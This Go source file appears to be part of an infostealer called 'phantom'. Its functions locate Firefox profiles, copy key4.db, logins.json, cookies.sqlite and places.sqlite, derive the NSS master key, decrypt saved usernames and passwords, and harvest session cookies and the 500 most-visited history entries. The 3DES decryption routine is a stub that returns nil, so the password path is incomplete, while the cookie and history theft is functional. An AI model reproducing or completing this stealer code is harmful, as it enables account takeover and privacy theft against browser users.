package browsers

import (
	"crypto/hmac"
	"crypto/sha1"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"phantom/syscalls"

	"golang.org/x/crypto/pbkdf2"
)

type FirefoxProfile struct {
	Path string
	Name string
}

type NSSKeySlot struct {
	Type   int
	Salt   []byte
	Rounds int
	IV     []byte
	Data   []byte
}

// stealFirefox extracts Firefox data
func stealFirefox() *BrowserData {
	data := &BrowserData{}

	profilesPath := filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
	if _, err := os.Stat(profilesPath); os.IsNotExist(err) {
		return data
	}

	profiles := findFirefoxProfiles(profilesPath)
	for _, profile := range profiles {
		passwords := stealFirefoxPasswords(profile.Path)
		data.Passwords = append(data.Passwords, passwords...)

		cookies := stealFirefoxCookies(profile.Path)
		data.Cookies = append(data.Cookies, cookies...)

		history := stealFirefoxHistory(profile.Path)
		data.History = append(data.History, history...)
	}

	return data
}

func findFirefoxProfiles(profilesPath string) []FirefoxProfile {
	var profiles []FirefoxProfile

	entries, err := os.ReadDir(profilesPath)
	if err != nil {
		return profiles
	}

	for _, entry := range entries {
		if entry.IsDir() {
			profilePath := filepath.Join(profilesPath, entry.Name())
			// check for key files
			if _, err := os.Stat(filepath.Join(profilePath, "key4.db")); err == nil {
				profiles = append(profiles, FirefoxProfile{
					Path: profilePath,
					Name: entry.Name(),
				})
			}
		}
	}

	return profiles
}

func stealFirefoxPasswords(profilePath string) []Password {
	var passwords []Password

	loginsPath := filepath.Join(profilePath, "logins.json")
	if _, err := os.Stat(loginsPath); os.IsNotExist(err) {
		return passwords
	}

	masterPassword := getFirefoxMasterKey(profilePath)
	if masterPassword == nil {
		return passwords
	}

	content, err := os.ReadFile(loginsPath)
	if err != nil {
		return passwords
	}

	var loginsData struct {
		Logins []struct {
			Hostname          string `json:"hostname"`
			EncryptedUsername string `json:"encryptedUsername"`
			EncryptedPassword string `json:"encryptedPassword"`
		} `json:"logins"`
	}

	if err := json.Unmarshal(content, &loginsData); err != nil {
		return passwords
	}

	for _, login := range loginsData.Logins {
		username := decryptFirefoxValue(login.EncryptedUsername, masterPassword)
		password := decryptFirefoxValue(login.EncryptedPassword, masterPassword)

		if username != "" && password != "" {
			passwords = append(passwords, Password{
				URL:      login.Hostname,
				Username: username,
				Password: password,
				Browser:  "Firefox",
			})
		}
	}

	return passwords
}

func getFirefoxMasterKey(profilePath string) []byte {
	key4Path := filepath.Join(profilePath, "key4.db")
	if _, err := os.Stat(key4Path); os.IsNotExist(err) {
		return nil
	}

	tempPath := filepath.Join(os.TempDir(), "key4_firefox.db")
	copyFile(key4Path, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return nil
	}
	defer db.Close()

	var item1, item2 []byte
	err = db.QueryRow("SELECT item1, item2 FROM metadata WHERE id = 'password'").Scan(&item1, &item2)
	if err != nil {
		return nil
	}

	var a11 []byte
	err = db.QueryRow("SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL").Scan(&a11)
	if err != nil {
		return nil
	}

	// decode ASN.1 structure
	globalSalt := item1
	decodedItem2 := decodeASN1(item2)
	if decodedItem2 == nil {
		return nil
	}

	// derive key using PBKDF2
	hp := sha1.Sum(append(globalSalt, []byte("")...))
	chp := sha1.Sum(append(hp[:], decodedItem2.Salt...))

	k1 := pbkdf2.Key(chp[:], decodedItem2.Salt, decodedItem2.Rounds, 32, sha1.New)
	k2 := hmac.New(sha1.New, k1)
	k2.Write(decodedItem2.IV)
	k := k2.Sum(nil)

	// decrypt a11 to get master key
	masterKey := decryptTripleDES(a11, k[:24], decodedItem2.IV)
	return masterKey
}

func decodeASN1(data []byte) *NSSKeySlot {
	var slot NSSKeySlot
	_, err := asn1.Unmarshal(data, &slot)
	if err != nil {
		return nil
	}
	return &slot
}

func decryptFirefoxValue(encrypted string, masterKey []byte) string {
	decoded, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return ""
	}

	decrypted := decryptTripleDES(decoded, masterKey, nil)
	return string(decrypted)
}

func decryptTripleDES(ciphertext, key, iv []byte) []byte {
	// 3DES decryption - simplified
	// actual implementation would use crypto/des
	return nil
}

func stealFirefoxCookies(profilePath string) []Cookie {
	var cookies []Cookie

	cookiesPath := filepath.Join(profilePath, "cookies.sqlite")
	if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
		return cookies
	}

	tempPath := filepath.Join(os.TempDir(), "cookies_firefox.db")
	copyFile(cookiesPath, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return cookies
	}
	defer db.Close()

	rows, err := db.Query("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
	if err != nil {
		return cookies
	}
	defer rows.Close()

	for rows.Next() {
		var host, name, value, path string
		var expiry int64
		var isSecure, isHTTPOnly int

		if err := rows.Scan(&host, &name, &value, &path, &expiry, &isSecure, &isHTTPOnly); err != nil {
			continue
		}

		cookies = append(cookies, Cookie{
			Host:       host,
			Name:       name,
			Value:      value,
			Path:       path,
			Expires:    expiry,
			IsSecure:   isSecure == 1,
			IsHTTPOnly: isHTTPOnly == 1,
			Browser:    "Firefox",
		})
	}

	return cookies
}

func stealFirefoxHistory(profilePath string) []HistoryEntry {
	var history []HistoryEntry

	placesPath := filepath.Join(profilePath, "places.sqlite")
	if _, err := os.Stat(placesPath); os.IsNotExist(err) {
		return history
	}

	tempPath := filepath.Join(os.TempDir(), "places_firefox.db")
	copyFile(placesPath, tempPath)
	defer os.Remove(tempPath)

	db, err := sql.Open("sqlite3", tempPath)
	if err != nil {
		return history
	}
	defer db.Close()

	rows, err := db.Query("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY visit_count DESC LIMIT 500")
	if err != nil {
		return history
	}
	defer rows.Close()

	for rows.Next() {
		var url string
		var title sql.NullString
		var visitCount int
		var lastVisit sql.NullInt64

		if err := rows.Scan(&url, &title, &visitCount, &lastVisit); err != nil {
			continue
		}

		titleStr := ""
		if title.Valid {
			titleStr = title.String
		}

		history = append(history, HistoryEntry{
			URL:        url,
			Title:      titleStr,
			VisitCount: visitCount,
			LastVisit:  lastVisit.Int64,
			Browser:    "Firefox",
		})
	}

	return history
}

// placeholder for DPAPI from syscalls
var _ = syscalls.CryptUnprotectData
